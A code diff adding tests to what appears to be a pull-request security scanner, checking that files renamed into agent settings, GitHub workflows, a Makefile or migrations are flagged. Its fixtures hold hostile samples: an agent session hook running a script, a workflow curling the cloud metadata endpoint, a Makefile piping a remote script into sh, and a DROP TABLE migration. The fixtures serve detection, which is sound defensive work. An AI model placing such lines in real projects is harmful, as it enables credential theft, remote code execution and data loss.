@@ -2170,3 +2170,177 @@ class TestDetectorD10AndExtendedIntegrity:
         ])
         d06_findings = [f for f in rep.findings if f.consequence_class == "SECURITY_GUARD_WEAKENED"]
         assert len(d06_findings) == 0
+
+
+# ==============================================================================
+# 7. ROUND-3 ADVERSARIAL EVALUATION FIXES (AUDIT_LOG, Audit Run: 2026-10-29)
+# ==============================================================================
+
+def _r3_git(repo, *args):
+    return repo.git.execute(["git", *args])
+
+
+def _r3_stage(repo, root, files):
+    """Write ``files`` ({path: str | bytes}) into the work tree and stage them."""
+    for rel, content in files.items():
+        p = root / rel
+        p.parent.mkdir(parents=True, exist_ok=True)
+        if isinstance(content, bytes):
+            p.write_bytes(content)
+        else:
+            p.write_bytes(content.encode("utf-8"))
+        _r3_git(repo, "add", "--", rel)
+
+
+def _r3_move(repo, root, src, dst):
+    (root / dst).parent.mkdir(parents=True, exist_ok=True)
+    _r3_git(repo, "mv", src, dst)
+
+
+def _r3_stage_symlink(repo, root, rel, target):
+    """Stage ``rel`` as a Git symlink (mode 120000) to ``target`` without creating an OS symlink."""
+    tmp = root.parent / f"{root.name}-symlink-target"
+    tmp.write_bytes(target.encode("utf-8"))
+    sha = _r3_git(repo, "hash-object", "-w", str(tmp)).strip()
+    tmp.unlink()
+    _r3_git(repo, "update-index", "--add", "--cacheinfo", f"120000,{sha},{rel}")
+
+
+def _r3_repo(tmp_path, base_files, edit):
+    """Commit ``base_files`` as ``main``, apply ``edit(repo, root)`` on branch ``feature`` and commit."""
+    import git
+
+    root = tmp_path / "repo"
+    root.mkdir()
+    repo = git.Repo.init(root)
+    with repo.config_writer() as cw:
+        cw.set_value("user", "name", "Test")
+        cw.set_value("user", "email", "test@example.com")
+        cw.set_value("core", "autocrlf", "false")
+    _r3_stage(repo, root, base_files)
+    _r3_git(repo, "commit", "-q", "-m", "base")
+    repo.create_head("main")
+    repo.create_head("feature").checkout()
+    edit(repo, root)
+    _r3_git(repo, "commit", "-q", "-m", "head")
+    return root
+
+
+def _r3_analyze(root, mode="enforce", description="Update files"):
+    from analyze import PayloadAnalyzer, PayloadGuardConfig
+
+    cfg = PayloadGuardConfig()
+    cfg.consequence["mode"] = mode
+    return PayloadAnalyzer(str(root), "feature", "main", config=cfg).analyze(pr_description=description)
+
+
+def _r3_findings(rep, detector=None):
+    return [
+        f for f in rep["consequence_analysis"].get("findings", [])
+        if detector is None or f["detector_id"] == detector
+    ]
+
+
+_R3_SESSION_HOOK = json.dumps({
+    "hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "node .github/setup.js"}]}]}
+})
+
+
+class TestRound3RenameActivation:
+    """MOVE-01: a rename into an active config, workflow, build or migration path activates its content."""
+
+    def test_rename_into_claude_settings_is_scanned(self, tmp_path):
+        root = _r3_repo(
+            tmp_path,
+            {"samples/settings.json": _R3_SESSION_HOOK, ".github/setup.js": "console.log('setup')\n"},
+            lambda repo, root: _r3_move(repo, root, "samples/settings.json", ".claude/settings.json"),
+        )
+        for mode in ("shadow", "advisory", "enforce"):
+            rep = _r3_analyze(root, mode, "Move agent settings")
+            assert rep["files"]["renamed"] == 1
+            types = [s["type"] for fl in rep["ai_config_poisoning"]["flagged_configs"] for s in fl["signals"]]
+            assert "command_in_session_hook" in types
+            assert rep["verdict"]["status"] == "DESTRUCTIVE"
+
+    def test_rename_between_inactive_paths_is_not_flagged(self, tmp_path):
+        root = _r3_repo(
+            tmp_path,
+            {"samples/settings.json": _R3_SESSION_HOOK},
+            lambda repo, root: _r3_move(repo, root, "samples/settings.json", "examples/settings.json"),
+        )
+        rep = _r3_analyze(root, "enforce", "Move example settings")
+        assert rep["ai_config_poisoning"]["total"] == 0
+        assert rep["verdict"]["status"] == "SAFE"
+
+    def test_rename_into_workflow_directory_is_scanned(self, tmp_path):
+        wf = (
+            "name: triage\n"
+            "on: issues\n"
+            "jobs:\n"
+            "  t:\n"
+            "    runs-on: ubuntu-latest\n"
+            "    steps:\n"
+            "      - run: echo \"${{ github.event.issue.title }}\"\n"
+            "      - run: curl http://169.254.169.254/latest/meta-data/\n"
+        )
+        root = _r3_repo(
+            tmp_path,
+            {"docs/examples/triage.yml": wf},
+            lambda repo, root: _r3_move(repo, root, "docs/examples/triage.yml", ".github/workflows/triage.yml"),
+        )
+        rep = _r3_analyze(root, "enforce", "Enable triage workflow")
+        types = [s["type"] for fl in rep["actions_poisoning"]["flagged_workflows"] for s in fl["signals"]]
+        assert "credential_harvest" in types
+        assert _r3_findings(rep, DETECTOR_D08_WORKFLOW)
+
+    def test_rename_within_workflow_directory_keeps_base_for_d08(self, tmp_path):
+        wf = (
+            "name: triage\n"
+            "on: issues\n"
+            "jobs:\n"
+            "  t:\n"
+            "    runs-on: ubuntu-latest\n"
+            "    steps:\n"
+            "      - run: echo \"${{ github.event.issue.title }}\"\n"
+        )
+        root = _r3_repo(
+            tmp_path,
+            {".github/workflows/a.yml": wf},
+            lambda repo, root: _r3_move(repo, root, ".github/workflows/a.yml", ".github/workflows/b.yml"),
+        )
+        rep = _r3_analyze(root, "enforce", "Rename workflow file")
+        assert not _r3_findings(rep, DETECTOR_D08_WORKFLOW)
+
+    def test_rename_into_makefile_is_build_wrapper_tampering(self, tmp_path):
+        recipe = "build:\n\tcurl -fsSL https://example.invalid/i.sh | sh\n"
+        root = _r3_repo(
+            tmp_path,
+            {"docs/Makefile.example": recipe},
+            lambda repo, root: _r3_move(repo, root, "docs/Makefile.example", "Makefile"),
+        )
+        rep = _r3_analyze(root, "enforce", "Use the documented Makefile")
+        classes = {f["consequence_class"] for f in _r3_findings(rep, DETECTOR_D05_BUILD)}
+        assert "BUILD_WRAPPER_TAMPERING" in classes
+        assert rep["verdict"]["status"] == "DESTRUCTIVE"
+
+    def test_rename_into_migrations_reports_drop(self, tmp_path):
+        root = _r3_repo(
+            tmp_path,
+            {"scratch/drop_users.sql": "DROP TABLE users;\n"},
+            lambda repo, root: _r3_move(repo, root, "scratch/drop_users.sql", "migrations/0005_drop_users.sql"),
+        )
+        rep = _r3_analyze(root, "enforce", "Add migration")
+        assert _r3_findings(rep, DETECTOR_D10_MIGRATION)
+
+    def test_active_base_source_rules(self):
+        from consequence_engine import _active_base_source
+
+        watched = lambda p: p.startswith("migrations/")  # noqa: E731
+        moved_in = FileDeltaInput("migrations/1.sql", old_path="scratch/1.sql", change_type="R",
+                                  base_source="DROP TABLE t;", head_source="DROP TABLE t;")
+        moved_within = FileDeltaInput("migrations/2.sql", old_path="migrations/1.sql", change_type="R",
+                                      base_source="DROP TABLE t;", head_source="DROP TABLE t;")
+        modified = FileDeltaInput("migrations/1.sql", change_type="M", base_source="a", head_source="b")
+        assert _active_base_source(moved_in, watched) == ""
+        assert _active_base_source(moved_within, watched) == "DROP TABLE t;"
+        assert _active_base_source(modified, watched) == "a"
